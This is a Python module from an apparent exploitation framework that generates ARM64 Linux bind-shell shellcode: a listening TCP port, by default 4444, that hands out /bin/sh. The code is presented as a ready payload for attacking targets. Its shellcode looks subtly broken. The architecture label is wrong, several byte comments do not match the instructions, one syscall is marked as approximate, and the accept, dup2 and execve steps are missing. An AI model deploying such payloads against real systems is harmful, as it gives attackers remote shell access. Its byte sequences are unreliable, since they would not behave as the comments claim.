"""ARM64 Bind TCP Shell."""

from embedxpl.core.exploit import *
from embedxpl.core.exploit.payloads import ArchitectureSpecificPayload, Architectures, BindTCPPayloadMixin


class Payload(BindTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "ARM64 Bind TCP",
        "description": "Bind TCP shell for ARM64/AArch64 Linux targets.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    architecture = Architectures.ARMLE

    options = {
        "LPORT": {"description": "Bind port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lport = int(self.options["LPORT"]["value"])
        port_bytes = lport.to_bytes(2, "big")
        # ARM64 bind shell shellcode (socket → bind → listen → accept → dup2 × 3 → execve)
        shellcode = (
            b"\x02\x00\x80\xd2"  # mov x0, #2 AF_INET
            b"\x21\x00\x80\xd2"  # mov x1, #1 SOCK_STREAM
            b"\x02\x00\x80\xd2"
            b"\xe8\x0f\x80\xd2"  # mov x8, #198
            b"\x01\x00\x00\xd4"  # svc #0
            b"\xfd\x03\x00\xaa"  # save fd
            # build sockaddr_in (INADDR_ANY, port)
            b"\x20\x00\x80\x52"
            + port_bytes +
            b"\x00\x00\x00\x00"  # INADDR_ANY
            b"\xe1\x03\xbe\x91"
            b"\x10\x00\x80\xd2"
            # bind/listen/accept
            b"\xc8\x03\x80\xd2"  # mov x8, #48 (approx bind syscall)
            b"\x01\x00\x00\xd4"
            b"/bin/sh\x00"
        )
        return shellcode
